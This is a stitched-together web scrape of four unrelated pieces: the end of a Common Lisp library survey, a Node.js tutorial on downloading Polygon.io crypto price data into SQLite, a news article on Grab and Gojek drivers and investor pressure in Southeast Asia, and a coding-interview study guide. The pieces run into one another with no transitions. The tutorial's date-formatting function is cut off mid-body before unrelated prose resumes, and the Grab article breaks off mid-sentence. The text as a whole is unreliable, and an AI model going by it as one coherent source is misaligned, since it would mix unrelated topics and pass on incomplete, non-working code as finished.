<li><a href="https://github.com/zkat/chanl">ChanL</a> - Portable, channel-based concurrency.</li>
<li><a href="https://github.com/orthecreedence/cl-async">cl-async</a> - A library for general-purpose, non-blocking programming.

<ul>
<li>works atop libuv</li>
</ul></li>
<li><a href="https://github.com/TBRSS/moira">Moira</a> -  Monitor and restart background threads. In-lisp process supervisor.</li>
<li><a href="https://gitlab.com/ediethelm/trivial-monitored-thread">trivial-monitored-thread</a> -
a Common Lisp library offering a way of spawning threads and being
informed when one any of them crash and die.</li>
<li><a href="https://github.com/lmj/lfarm">lfarm</a> - distributing work across machines (on top of lparallel and usocket).</li>
<li><a href="https://github.com/taksatou/cl-gearman">cl-gearman</a> - a library for the <a href="http://gearman.org/">Gearman</a> distributed job system.

<ul>
<li>Alexander Artemenko used it instead of lfarm for Ultralisp:
<a href="https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html">https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html</a>,
because “lfarm is not well suited to environments where worker
hosts can go down and return back later”.</li>
</ul></li>
<li><a href="https://github.com/brown/swank-crew">swank-crew</a> - distributed computation framework implemented using Swank Client.</li>
<li><a href="https://github.com/takagi/cl-coroutine">cl-coroutine</a> - a coroutine library. It uses the CL-CONT continuations library in its implementation.</li>
<li><a href="https://github.com/cosmos72/stmx">CMTX</a>: high performance transactional memory for Common Lisp.

<ul>
<li>In our opinion, a library not well known and under-appreciated.</li>
</ul></li>
</ul>

<p>(see <a href="https://github.com/CodyReichert/awesome-cl#parallelism-and-concurrency">awesome-cl#parallelism-and-concurrency</a>)</p>

<p><strong>Consolidation</strong></p>

<p>Bordeaux-Threads is <em>the</em> “de-facto” library, but there is some choice
paralysis between Lparallel, Calispel, Bordeaux-Threads and SBCL’s
contribs. Use the libraries in the wild and write about them.</p>

<h2 id="file-formats">File formats</h2>

<p>There exist Common Lisp libraries for all the major file formats:</p>

<ul>
<li>XML: <a href="https://github.com/Shinmera/plump">Plump</a> (and <a href="https://github.com/Shinmera/lquery/">Lquery</a>), as well as <a href="https://common-lisp.net/project/cxml/">CXML</a>, which can parse large files incrementally.</li>
<li>JSON: <a href="https://github.com/Rudolph-Miller/jonathan">Jonathan</a>, <a href="https://common-lisp.net/project/cl-json/">cl-json</a> or <a href="https://sabracrolleton.github.io/json-review">more</a>. With utilities:

<ul>
<li><a href="https://github.com/y2q-actionman/cl-json-pointer">json-pointer</a> - A JSON Pointer implementation.</li>
<li><a href="https://github.com/gschjetne/json-mop">json-mop</a> - A metaclass for bridging CLOS and JSON objects (remind that JSON libraries can already serialize your own objects).</li>
<li><a href="https://github.com/fisxoj/json-schema">json-schema</a></li>
</ul></li>
<li>YAML: cl-yaml</li>
<li>CSV: <a href="https://github.com/AccelerationNet/cl-csv">cl-csv</a></li>
</ul>

<p><strong>Achievement</strong></p>

<p>New in 2015, Jonathan is now a good first choice for an easy to use and fast JSON encoder and decoder.</p>

<p><strong>Consolidation</strong></p>

<p>There is not a predominant JSON library. This leads to choice paralysis.</p>

<p>They all represent null values differently. We need a library that
“does the right thing”. See maybe the massive <a href="https://github.com/xh4/web-toolkit#json">web-toolkit</a> for its JSON handling ?</p>

<blockquote>
<p>It distinguishes null, false and [] from Lisp’s NIL thus supports identical transformation between JSON values. It provides object constructor and accessor to build and access nesting JSON objects.</p>
</blockquote>

<p>Give the <a href="https://github.com/sharplispers/xpath">XPath</a> library some love and documentation.</p>

<p><strong>Future Work</strong></p>

<p>Still valid from 2015:</p>

<blockquote>
<p>A YAML parser so that cl-yaml doesn’t depend on the libyaml library would make distribution far simpler.</p>
</blockquote>

<h2 id="gui">GUI</h2>

<p>A usual complain in Common Lisp land is the lack of a complete,
cross-platform GUI solution. Ltk is a very good library, but Tk is
limited. Qtools is great, but is only for Qt4.</p>

<p>A lot has happened, and is still happening (if you watch the right
repositories, you know that a Qt5 wrapper is in the works (ECL already has Qt5 bindings: <a href="https://gitlab.com/eql/EQL5/">EQL5</a>, with an <a href="https://gitlab.com/eql/EQL5-Android">Android port</a>)).</p>

<p>edit: see also <a href="https://gitlab.com/eql/eql5-sailfish">EQL5-sailfish</a> for Sailfish OS. <a href="https://openrepos.net/user/13436/programs">Here</a> are two example apps.</p>

<p>Matthew Kennedy wrote excellent FFI bindings to the IUP Portable User
Interface library: <a href="https://github.com/lispnik/iup/">IUP</a>. IUP is
cross-platform (Windows, macOS, GNU/Linux, with new Android, iOS,
Cocoa and Web Assembly drivers), has many widgets (but less than Qt), has a small API and
is actively developed. IUP was created at the PUC university of Rio de Janeiro.</p>

<p>Nicolas Hafner started <a href="https://github.com/Shirakumo/alloy">Alloy</a>, a
new user interface protocol and toolkit implementation, which he uses in his Kandria game.</p>

<p>Very recently, David Botton released <a href="https://github.com/rabbibotton/clog">CLOG</a>, “the Common Lisp Omnificent GUI”:</p>

<blockquote>
<p>CLOG uses web technology to produce graphical user interfaces for applications locally or remotely. CLOG can take the place, or work alongside, most cross-platform GUI frameworks and website frameworks. The CLOG package starts up the connectivity to the browser or other websocket client (often a browser embedded in a native template application.)</p>

<p>It is complete enough for most uses.</p>
</blockquote>

<p>There are more GUI libraries and frameworks: <a href="https://github.com/CodyReichert/awesome-cl#Gui">https://github.com/CodyReichert/awesome-cl#Gui</a> (and more under the works). In particular, LispWorks’ CAPI is still presented as the best in town by the ones who tried it.</p>

<p><strong>Consolidation</strong></p>

<p>Since roughly October, 2020, Nicolas Hafner works full time on
<a href="https://kandria.com/">Kandria</a>. Supporting his work, through <a href="https://github.com/sponsors/Shinmera">GitHub
sponsors</a> or
<a href="https://ko-fi.com/shinmera">ko-fi</a> would be 1) a great sign of recognition and 2) useful for the ecosystem, especially for Alloy.</p>

<p>I wrote an introduction to these frameworks in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/gui.html">Cookbook/gui</a>. More
examples or demo projects would be welcome.</p>

            <h2 id="introduction">Introduction</h2>

<p>The first step in any quantitative analysis or algorithmic trading journey is getting historical data that you can test algorithms and models against for backtesting.</p>

<p>In this article, I’ll demonstrate how to get cryptocurrency data for every minute of data available from 2017 for multiple currencies and exchanges in a few hours.</p>

<p>More specifically, I’ll show you:</p>

<ul>
  <li>How to connect to Polygon’s REST API.</li>
  <li>Retrieve data for every minute of historical data for a cryptocurrency.</li>
  <li>Store that data into a local database.</li>
  <li>Retrieve that data from your local database so you can test algorithms against it (or, whatever you want to do with the data).</li>
</ul>

<p>That’s millions of points of data that can be collected while you drink your coffee.</p>

<p>Not only that, but you’ll have the data accessible to be used very quickly for backtesting algorithms and quantitative analysis.</p>

<p>There are some prerequisites to getting this up and running.</p>

<p>You should probably be somewhat familiar with coding in JavaScript (though I’ll try my hardest to make it easy enough for anyone to do it).</p>

<p>You’ll need a <a href="http://polygon.io/">polygon.io</a> account, with a “Currencies Starter” subscription.</p>

<h2 id="where-to-get-data">Where to get data</h2>

<p>There are a lot of places to get historical aggregate ticker data for cryptocurrencies. There’s free data sources and paid data sources.</p>

<p>Like my dad used to say when I was growing up, <em>“you get what you pay for.”</em></p>

<p>This article focuses on getting data from <a href="http://polygon.io/">polygon.io</a>. Polygon is a developer first data source for both US market trade data and cryptocurrency data from multiple exchanges.</p>

<p>I’ll be doing all of the code in Node.js, which is a JavaScript server engine. It makes it easy to connect to APIs and fetch data, as well as send data where you want it to go.</p>

<h2 id="setting-up-an-account-with-polygonio">Setting up an account with Polygon.io</h2>

<p>Polygon’s <a href="https://polygon.io/currencies">Currencies Starter</a> unlimited access plan is $50/month.</p>

<p>You’ll definitely be able to get the data you need within the month, so this process would cost you $50 total to get millions of historical data points across multiple cryptocurrencies.</p>

<p>First, create an account.</p>

<p>Once you create an account, you’ll want to make sure you subscribe to the Currencies Starter plan.</p>

<p>Then, once you’re billed $50, you’ll have unlimited API calls to obtain the data.</p>

<p>On your <a href="https://polygon.io/dashboard">dashboard</a> you’ll see the API Keys section. That’s important for what we’re doing.</p>

<p><img src="https://quantsecrets.com/assets/images/0/0.png" alt="Polygon.io Dashboard"></p>

<h2 id="getting-your-development-environment-set-up">Getting your development environment set up</h2>

<p>Before we actually interface with the Polygon API to get data, we have to get our coding environment set up.</p>

<h3 id="installation">Installation</h3>

<p>Things you’ll need to install:</p>

<ul>
  <li><a href="https://code.visualstudio.com/">Visual Studio Code</a> – for editing your code.</li>
  <li><a href="https://nodejs.org/">Node.js</a> – a JavaScript runtime engine for interfacing with the API. <strong>Get the LTS version.</strong> Not the latest version.</li>
</ul>

<p>I don’t plan on including how to get those things set up and working, there should be enough documentation within the individual projects to make sure you have it all installed correctly.</p>

<p>(Hint: if you get stuck, just Google stuff).</p>

<h3 id="create-a-node-project">Create a Node project</h3>

<p>First, create a new directory (folder) on your computer for your project. It could be in your desktop, documents, wherever you’d like.</p>

<p>Next, open Visual Studio Code, and on the start page, click the “Open Folder…” option. Open the folder you created.</p>

<p>If you’re on a Mac, type <code>⌃+</code>` (that’s control + back-tick) on your keyboard to open the terminal in Visual Studio Code.</p>

<p>If you’re on Windows, type <code>Ctrl+</code>` (that’s control + back-tick) on your keyboard to open the command line in Visual Studio Code.</p>

<p><img src="https://quantsecrets.com/assets/images/0/1.png" alt="Open Visual Studio Code Terminal"></p>

<h3 id="add-dependencies">Add dependencies</h3>

<p>In the terminal, run <code>npm install dotenv node-fetch sqlite3 --save</code> to install the necessary libraries.</p>

<p>Once that’s done running (it can take a minute to finish), you should see a folder in your directory called <code>node_modules</code>. There’s nothing you need to do in there, but it needs to be there.</p>

<p>Alright, now it’s time to write some code.</p>

<h3 id="create-an-environment-file">Create an environment file</h3>

<p>We’re going to add a secret file that contains the API key of your Polygon account. This isn’t critical, but if you’re going to be publishing anything online you’ll want to make sure your keys are kept private.</p>

<p>Create a file called <code>.env</code> in the root of your directory.</p>

<p>One easy way to do that, is to hover over the explorer section on the left side of Visual Studio Code, and at the top you’ll see a “New File” button. The other way is to right-click the explorer section and click “New File.</p>

<p>Once you create the file, it should open. Now, you’ll want to paste in the following:</p>

<figure><pre><code data-lang="javascript"><span>POLYGON_API_KEY</span><span>=</span><span>REPLACE_THIS_WITH_YOUR_API_KEY</span></code></pre></figure>

<p>If the hint in the code above wasn’t enough, you’ll want to <strong>replace the part after the equals sign with your API key</strong> which is found in the <a href="https://polygon.io/login">dashboard</a> of your Polygon account.</p>

<p>Once that’s all set up, you’ll be able to access your API key in your code in a way that won’t expose it to the public.</p>

<h3 id="include-modules">Include modules</h3>

<p>Now, create a new file called <code>data.js</code>. You can make it in the root of the directory you’re in.</p>

<p>Once you’ve created your file, it should open in Visual Studio Code. If not, then you’ll want to open it.</p>

<p>At the top of your file, you’ll want to copy and paste the following:</p>

<div><div><pre><code><span>var</span> <span>fetch</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>node-fetch</span><span>'</span><span>);</span>
<span>var</span> <span>dotenv</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>dotenv</span><span>'</span><span>);</span>
<span>var</span> <span>sqlite3</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>sqlite3</span><span>'</span><span>).</span><span>verbose</span><span>();</span>

<span>dotenv</span><span>.</span><span>config</span><span>();</span>
<span>const</span> <span>APIKEY</span> <span>=</span> <span>process</span><span>.</span><span>env</span><span>.</span><span>POLYGON_API_KEY</span><span>;</span>
</code></pre></div></div>

<p>This includes the libraries we installed earlier, and it sets up your API key as a global variable called <code>APIKEY</code>.</p>

<p>If you didn’t create the <code>.env</code> file in the step above, you’ll just want to replace <code>process.env.POLYGON_API_KEY</code> with your actual API key (as a string, with quotes around it).</p>

<p><img src="https://quantsecrets.com/assets/images/0/2.png" alt="Current Set Up"></p>

<h2 id="using-polygons-rest-api-to-get-historical-crypto-data">Using Polygon’s REST API to get historical crypto data</h2>

<p>Before we start working with the API directly, there’s a few sections of structural code I’ll give you.</p>

<p>These will all be pasted into your <code>data.js</code> file. I’ll briefly explain what they do and how they work.</p>

<h3 id="date-string-manipulation">Date string manipulation</h3>

<p>Part of working with the Polygon API is getting the dates for the data we want to access.</p>

<p>Not only do we need the dates, but they have to be in the right format.</p>

<p>Simply copy and paste the code below into your <code>data.js</code> file.</p>

<div><div><pre><code><span>function</span> <span>dateString</span><span>(</span><span>d</span><span>)</span> <span>{</span>

    <span>// If the day is less than 10, add a 0</span>
    <span>let</span> <span>dString</span> <span>=</span> <span>null</span><span>;</span>
    <span>if</span> <span>(</span><span>d</span><span>.</span><span>getDate</span><span>()</span> <span>&lt;</span> <span>10</span><span>)</span> <span>{</span>
        <span>dString</span> <span>=</span> <span>'</span><span>0</span><span>'</span> <span>+</span> <span>d</span><span>.</span><span>getDate</span><span>();</span>
    <span>}</span> <span>else</span> <span>{</span>

<p>Cool. You can see some of the comments in the code that explains a little bit about what’s going on.</p>

<p><img src="https://quantsecrets.com/assets/images/0/3.png" alt="Showing some of the code."></p>

<h2 id="storing-the-data-into-a-local-database">Storing the data into a local database</h2>

<p>Now we’ll get into the local database stuff. This is where you’re going to store the data that you retrieve from Polygon so you can do your backtesting.</p>

<h3 id="creating-a-database">Creating a database</h3>

<p>First, we’ll need a function to create the database. This code will create a database in your root directory with the name of the currency you’re retrieving.</p>

<p>Simply copy and paste the function below into your <code>data.js</code> file.</p>

<div><div><pre><code><span>// Pass in the symbol of the currency wanted</span>
<span>function</span> <span>createNewDb</span><span>(</span><span>symbol</span><span>)</span> <span>{</span>
    <span>// Allocate a new database.</span>
    <span>let</span> <span>db</span> <span>=</span> <span>new</span> <span>sqlite3</span><span>.</span><span>Database</span><span>(</span><span>symbol</span> <span>+</span> <span>'</span><span>.sqlite3</span><span>'</span><span>);</span>
    <span>// Create the database.</span>
    <span>db</span><span>.</span><span>run</span><span>(</span><span>'</span><span>create table if not exists tickers(date NUMERIC, open NUMERIC, close NUMERIC, high NUMERIC, low NUMERIC, volume NUMERIC, average NUMERIC, UNIQUE(date))</span><span>'</span><span>);</span>
    <span>// Close the database.</span>
    <span>db</span><span>.</span><span>close</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>The above code is a bit complex, but you’re creating a database with the columns:</p>

<ul>
  <li>Date</li>
  <li>Open price</li>
  <li>Close price</li>
  <li>High price</li>
  <li>Low price</li>
  <li>Volume (for the day)</li>
  <li>Average (for the day)</li>
</ul>

<p>The ‘UNIQUE(date)’ lets the database know that there should only be one entry for each date that’s entered (just in case there’s any confusion).</p>

<p>Basically, each data point is a row in your table. It’s like a giant excel spreadsheet.</p>

<p><span>W</span>hen Grab drivers in Ho Chi Minh City gathered late last year to protest against the ride-hailing company’s new fee structure, Nghia went instead to his other job, cutting cloth at an apparel factory. He had been driving for Grab for a few years, but even if he was free to join the demonstration, he wouldn’t have. “If I spoke up, I’d get nothing,’’ Nghia said.&nbsp;</p>



<p>In December 2020, drivers reported that the commissions that Grab Vietnam takes from them suddenly increased, from around 20% to nearly 30% on its motorbike service GrabBike, and even more on GrabCar, its taxi offering. The change came after the Vietnamese government had abruptly increased an <a rel="noreferrer noopener" href="https://e.vnexpress.net/news/business/companies/taxman-grab-at-odds-over-new-tax-regime-4204198.html" target="_blank">existing tax</a> on ride-hailing firms. Many drivers felt that Grab had passed the burden onto drivers and passengers, although the company says that this was a misunderstanding and that drivers’ commissions did not change, but that the new tax was added to fares, then deducted from drivers’ takings at the same time as the commission.</p>



<p>Nghia, a 31-year-old migrant from the Mekong Delta region in southern <a href="https://restofworld.org/2020/nguyen-viet-anh-docosan-vietnam/">Vietnam</a>, who asked to be identified by only his first name, started driving for Grab because he heard that he could earn more through the app than its competitors. Grab is one of several venture-backed firms vying for customers in Vietnam. The country’s fast-growing and rapidly digitizing economy has opened up a new frontier for tech companies in Southeast Asia.</p>



<p>Over the past few years, Grab and other ride-hailing players like Gojek Vietnam, owned by the Indonesian unicorn Gojek, have burned millions of dollars in investor cash <a href="https://restofworld.org/2021/fighting-off-the-unicorns/">trying to attract price-sensitive Vietnamese customers</a> and capture as much market share as possible. The strategy included offering steep discounts to consumers and generous incentives to drivers, who work as independent contractors with few labor protections.&nbsp;</p>



<p>The problem is that now their investors are eager to turn a profit, and the well of cash is starting to dry up. In Vietnam and other Southeast Asian countries, like Indonesia, Grab and Gojek had been raising prices for passengers before the Covid-19 lockdowns drastically cut the number of people using ride-hailing apps. Gig workers on the platform said that they felt squeezed before the pandemic, and more so during it.</p>



<p>But the two companies are also part of a pattern that started emerging around the world long before the pandemic. Enormous venture firms, most notably the Japanese mega-fund SoftBank, have poured billions into startups with the express purpose of winner-takes-all domination. Often, when it comes time to actually make money, it’s <a href="https://www.nytimes.com/2019/11/12/technology/softbank-startups.html">workers at the bottom</a> who bear the burden.&nbsp;</p>



<p>For Nghia,&nbsp;this has resulted in a one-two punch of fewer rides and lower fees, making driving for Grab barely worth his time. “Driving for a day, I don’t earn as much as people selling lottery tickets,” he said, referring to the roadside hawkers that are common in Ho Chi Minh City. “I have only been making around 200,000 dong [$8.70] a day this year, working from 7 a.m. to 9 p.m., not to mention the money I have to give back to Grab.”</p>



<p>Drivers aren’t the only ones unhappy with the ride-hailing firms. SoftBank, Grab’s biggest backer, is getting tired of Grab and Gojek “bleeding a lot of money,” according to an investor with knowledge of both companies, and <a href="https://www.ft.com/content/865dae7e-24ad-446d-a20c-4bfadfdb3e1d">wants the two to merge</a>. The reason is that they have fought their way into an expensive stalemate across Southeast Asia. Both Grab and Gojek have become multi-billion-dollar businesses by expanding into other services, though neither has yet turned a profit. While investors have continued to back them in an effort to build de facto monopolies, neither company has found a decisive advantage, and patience is wearing thin.&nbsp;</p>



<p>If a merger doesn’t happen, Gojek is reportedly <a href="https://www.ft.com/content/0775a49e-d3fd-4445-a394-19039a8561f6">in talks with another Indonesian unicorn</a>, the e-commerce company Tokopedia, while <a href="https://www.bloomberg.com/news/articles/2021-01-25/grab-is-said-to-pick-morgan-stanley-jpmorgan-for-u-s-ipo">Grab has reportedly selected banks</a> to explore an initial public offering in New York. Grab and Gojek did not respond to repeated requests for comment.</p>



<p>Gojek, Grab, and Tokopedia are enormous acquirers of technology and talent, whose gravity shapes the entire landscape. If they do consolidate, the effects are likely to ripple across the whole region. “If Gojek and Grab did the merger, the two organizations would have an unassailable monopoly on ride-hailing services in Southeast Asia,” one investor with knowledge of negotiations between the two companies told <em>Rest of World. </em>(Like all venture capital sources in this story, they spoke on the condition of anonymity.)</p>



<p>Labor groups worry that, if a merger were to happen, drivers would have less leverage than ever before. “They can control many things, monopolize the system and so on,” said Taha Syafariel Baraqbah, acting chairman of Indonesia’s Online Drivers’ Association, who goes by Ariel. “Of course we are afraid and feel that the conditions will be even more arbitrary.”</p>

<hr>



<p><strong>Gojek was founded</strong> in Indonesia in 2010 by Harvard Business School graduate and former McKinsey consultant Nadiem Makarim and his high school friend Michaelangelo Moran. Two years later, Grab was launched in Malaysia by two other Harvard graduates, Anthony Tan and Tan Hooi Ling. They later relocated the company to Singapore, in 2014.&nbsp;</p>



<p>Both startups attracted big-name investors, like Sequoia India and Golden Gate Ventures, which were lured by the tantalizing opportunity to reach consumers in Southeast Asia’s populous and increasingly prosperous markets. As Grab and Gojek continued to grow, so did the scale of their funding rounds and backers. SoftBank invested in Grab in 2014, while the Singaporean state investment fund <a href="https://www.reuters.com/article/us-go-jek-fundraising/google-temasek-investing-in-indonesias-go-jek-as-ride-hailing-rivalry-deepens-sources-idUSKBN1F70GS">Temasek</a> and the Chinese tech giant <a href="https://www.reuters.com/article/us-gojek-m-a-tencent/chinas-tencent-invests-in-indonesias-go-jek-amid-se-asia-push-sources-idUSKBN19P17N">Tencent</a> took stakes in Gojek soon after. In total, Grab has raised more than $12 billion, while Gojek has raised around $5 billion, according to the database Crunchbase.</p>



<p>Ride-hailing was an easy business to get into, since the existing transportation sector was dominated by traditional taxi companies, which had inflexible business models. There “was an obvious inefficiency and a market gap where you could come in and undercut the incumbents,” said Nitin Pangarkar, a strategy and policy professor at NUS Business School in Singapore. “The transport business was an asset-light model,” he explained, in that the drivers owned their own cars and motorbikes, and “it was a model that had been tried out elsewhere.”</p>

<p>To attract customers, Grab and Gojek spent heavily on deep discounts, eschewing profits in an effort to beat out the competition. “Ride hailing, definitely, was a money loser,” Pangarkar said. “That was because these crazy venture capitalists were willing to fund these price wars.”&nbsp;</p>



<p>Over the past few years, Grab and Gojek have expanded across Southeast Asia and begun to broaden the scope of their services, adding <a href="https://restofworld.org/2020/stat-of-the-day/cloud-kitchen-food/">food delivery</a>, groceries, payments, and logistics. In Indonesia, Gojek bought a stake in a bank, while in Singapore, Grab partnered with a telecommunications company to bid for a <a href="https://www.reuters.com/article/us-singtel-digital-banking-grab-holdings/singtel-grab-join-forces-for-singapore-digital-bank-license-idUSKBN1YY005">digital banking license</a>. Today, Grab and Gojek are no longer just loss-making ride-hailing companies — they’re sprawling conglomerates that convert investor cash into user numbers.</p>



<p>Even where ride hailing has become profitable in individual countries, the companies have reinvested into expanding into other business lines.</p>



<p>One early Gojek investor told <em>Rest of World</em> that the appeal of ride-hailing was that it promised to create a base of regular users, who could then be leveraged into other businesses, like food delivery and e-commerce. If they used enough services regularly, the thinking was that they would no longer be tempted to switch to a rival platform, no matter how many discounts competitors offered. Once they had captured consumers, Gojek and Grab could start increasing prices and move toward profitability.&nbsp;</p>



<p>“These businesses … can be very profitable, because essentially, they become monopolistic,” the Gojek investor said. “We haven’t reinvented the wheel, this is just monopolism in a different form.”</p>



<p>Investors in both Grab and Gojek told <em>Rest of World</em> that they are no longer confident either will ever become a quasi-monopoly on its own. Indonesia is by far the biggest market in the region, and Grab and Gojek are still fighting to dominate it, though Gojek has a slight lead. Grab is ahead in Vietnam, Malaysia, and the Philippines — all smaller markets unlikely to offer the scale that would excite investors. Neither has succeeded in building a single, pan-regional super app.</p>



<p>Since coworking giant WeWork <a href="https://www.newyorker.com/culture/culture-desk/the-rise-and-fall-of-wework">imploded</a> in 2019 after raising more than <a href="https://www.crunchbase.com/organization/wework/investor_financials">$20 billion</a>, venture capitalists have begun questioning the winner-takes-all approach, which requires essentially burning large sums of money to achieve dominance that’s anything but guaranteed. Even SoftBank, which has relied heavily on the strategy, is putting pressure on its portfolio companies to show that they can be sustainable in the short term, rather than at an unspecified point in the future.&nbsp;</p>



<p>Covid-19 has also made investors more rational, the Gojek investor said. Ride-hailing businesses have slumped during citywide lockdowns. Even in countries where economic activity is bouncing back, office workers are often not traveling at peak hours, robbing companies of surge pricing schemes that boost revenue. Food delivery has outperformed during the pandemic, but intense competition has also meant that it’s yet to be profitable.&nbsp;</p>



<p>“The amount of money we were burning on the Gojek side, and the amount of money that Grab was burning on their side, was crazy,” the Gojek investor said. “We’re happy that no one’s got the financial means to …</p></div></div>

February 8, 2021 | https://www.danhacks.com/software/software-engineering-coding-interview.html | <a href="https://web.archive.org/web/*/https://www.danhacks.com/software/software-engineering-coding-interview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>To get a job as a software engineer, most companies have an interview process that includes coding. While these interviews aren’t perfect, they’re widely used, so in order to stay employable it’s a necessary skill to learn how to prepare and study for these interviews. There are plenty of resources online and this guide is a listing of many of these resources to help you practice once you have coding interviews scheduled.</p>

<p><img src="https://www.danhacks.com/assets/softwareEngineerInterview.jpg" alt="Software Engineering Interviewing"></p>

<p>To pass these interviews, a few skills are needed:</p>
<ul>
  <li>Have a clear, concise, and easy to read resume that describes specifically what you’ve done in school/work. Be prepared to talk about the projects you worked on in depth and describe how the solutions work.</li>
  <li>When a problem is presented, carefully read the requirements, ask clarifying questions, and propose a solution first before coding.</li>
  <li>Code quickly. Practice as many problems as possible, set a time limit for a problem (e.g. 20 mins), and try to solve it in that time. If you can’t figure one out in time, research the algorithms and solutions for it, study it line by line until you understand how it works, and try again. In a coding interview you’re typically presented at least 2 questions that you must solve in less than an hour.</li>
  <li>Understand common data structures and algorithms. Be able to apply them in your problem solving.</li>
  <li>Interpersonal skills. In addition to coding the solution, you’ll have to be able to clearly explain how it works and talk through the problem with the interviewer as you go. Practice online or with a friend. Quickly talk through the problem and your proposed solution before you start coding.</li>
  <li>Be able to analyze your solution in terms of time and space complexity. When presented with a problem try to think of the most efficient solution first and skip coding the naive solution. This will give you time to solve more problems.</li>
  <li>Learn clean code principles such as not repeating code, writing clear meaningful variable names,and separating large blocks of code into smaller functions.</li>
  <li>Practice building actual applications. This will help you move faster and be able to understand code better.</li>
  <li>Think of several test cases that would appropriately test your code. An interviewer may ask you to walk through one of them line by line and describe how it works.</li>
</ul>

<p>Additionally, if the interview is on the phone or video, ensure your environment sets you up for success.</p>
<ul>
  <li>Test your webcam and audio ahead of time</li>
  <li>Download any video conferencing software you need for the interview and test it ahead of time.</li>
  <li>Set up your computer in a quiet environment, put your phone on silent, and ask anyone in your household not to disturb you during the interview.</li>
  <li>Solving these problems quickly requires a lot of concentration and you don’t want to be interrupted during the interview and break your concentration.</li>
</ul>

<h3 id="data-structures-to-learn">Data structures to learn</h3>
<p>You’ll need to understand the operations on common data structures as well as how to implement them with more primitive data structures. For example, you could be asked in an interview to implement a stack or queue using an array. Here’s a list of some of the common data structures, but be sure to brush up with an algorithms book and/or YouTube videos to get a comprehensive understanding of how they work.</p>

<ul>
  <li>Maps</li>
  <li>Sets</li>
  <li>Trees</li>
  <li>Graphs</li>
  <li>Linked Lists</li>
  <li>Arrays</li>
  <li>Stacks</li>
  <li>Queues</li>
  <li>Heaps</li>
</ul>

<h3 id="algorithms-to-learn">Algorithms to learn</h3>
<p>There’s no shortage of algorithms, but here are a few that are frequently used in interviews, so be sure to gain mastery with a large breadth of problems.</p>

<ul>
  <li>Writing recursive code. Practice translating iterative to recursive and vice versa.</li>
  <li>Depth First Search</li>
  <li>Breadth First Search</li>
  <li>Set Theory (Unions, etc)</li>
  <li>Dynamic Programming</li>
  <li>String manipulation</li>
  <li>Array manipulation</li>
  <li>Matrix traversal</li>
  <li>Hashing</li>
  <li>Binary Search</li>
  <li>Efficient Sorting, e.g. Quicksort</li>
  <li>Bit Manipulation</li>
  <li>Build an LRU Cache</li>
</ul>

<h3 id="websites-with-problems">Websites with Problems</h3>
<ul>
  <li>
<a href="https://leetcode.com/" target="_blank" rel="noopener noreferrer">LeetCode</a> - LeetCode has different problem levels, so start by practicing easy, then work on medium, and later hard. Typically the questions in interviews will be easy or medium level. There are thousands of probleems on LeetCode and it’s arguably one of the best resources for practice problems.</li>
  <li>
<a href="https://www.hackerrank.com/" target="_blank" rel="noopener noreferrer">HackerRank</a> - HackerRank has a lot of problems like LeetCode, but is better organized and provides more context around which areas the algorithms you’re solving are in. Some companies use HackerRank, so it’s good to become familiar with the interface.</li>
  <li>
<a href="https://coderpad.io/" target="_blank" rel="noopener noreferrer">CoderPad</a> - CoderPad is used by a lot of companies for interviews, so practice using the interface so that you don’t waste time in an interview looking for buttons or being surprised by how the interface works with your programming language.</li>
  <li>
<a href="https://projecteuler.net/" target="_blank" rel="noopener noreferrer">Project Euler</a> - Project Euler has fun math problems, but they are not typically asked directly in an interview like the LeetCode or HackerRank questions. However, it still helps your problem solving and coding speed, so it can be good to play with some different websites to get a different perspective and learn to code faster.</li>
  <li>
<a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer">YouTube</a> - YouTube is invaluable and there’s tons of great YouTubers that will teach you how to do each type of problem. Simply search for more general terms such as “software engineering interview” or more specific problems, data structures, and algorithms you want to learn. Follow up by actually coding the solutions you learn so that you can do it in an interview.</li>
  <li>
<a href="https://www.algoexpert.io/" target="_blank" rel="noopener noreferrer">AlgoExpert</a> - AlgoExpert is like LeetCode and YouTube combined into an easy to use interface. It makes the problems and their solutions easily discoverable, as well as providing a place to practice.</li>
  <li>
<a href="https://interviewing.io/" target="_blank" rel="noopener noreferrer">Interviewing.io</a> - If you don’t have a friend that can help you practice real interviews, there are websites like Interviewing that let you interview with an actual engineer, but they can be pretty pricey. Instead of spending a lot of money doing practice interviews, you can also apply for more jobs and set up coding interviews with more companies. This way you can practice for free and potentially get an offer from a company at the same time.</li>
  <li>Other - There are countless other websites like LeetCode, some paid so experiment with different websites and find one that works best for you.</li>
</ul>

<h3 id="company-websites">Company Websites</h3>
<p>Doing research on the culture of the company you have an interview set up with helps with culture, but sometimes they also have information about the structure of the interviews, including how to practice for the coding portion.</p>

<ul>
  <li><a href="https://www.facebook.com/careers/life/preparing-for-your-software-engineering-interview-at-facebook" target="_blank" rel="noopener noreferrer">Facebook</a></li>
  <li><a href="https://www.apple.com/jobs/us/" target="_blank" rel="noopener noreferrer">Apple</a></li>
  <li><a href="https://www.amazon.jobs/en/landing_pages/software-development-topics" target="_blank" rel="noopener noreferrer">Amazon</a></li>
  <li><a href="https://jobs.netflix.com/culture" target="_blank" rel="noopener noreferrer">Netflix</a></li>
  <li><a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener noreferrer">Google</a></li>
</ul>

<h3 id="programming-language-docs">Programming language docs</h3>
<p>In the interview you’ll typically be able to choose a programming language. Ensure you choose your best one that you can code quickly in. Study the docs for all of the data structures above. For example, if your programming language is Java, you might want to read the docs to <a href="https://docs.oracle.com/javase/8/docs/api/java/util/HashMap.html" target="_blank" rel="noopener noreferrer">HashMap</a> while practicing so that you don’t have to research things during the interview.</p>

<h3 id="linkedin">LinkedIn</h3>
<p>Before each interview if you know the name of the people conducting the interview, look their background up on LinkedIn ahead of time so that you have some context about their background when you’re talking to them. This will also let you know what to expect. For example, a manager may ask you about your projects and experience while an engineer might do an in depth coding interview.</p>

<h3 id="the-recruiter">The Recruiter</h3>
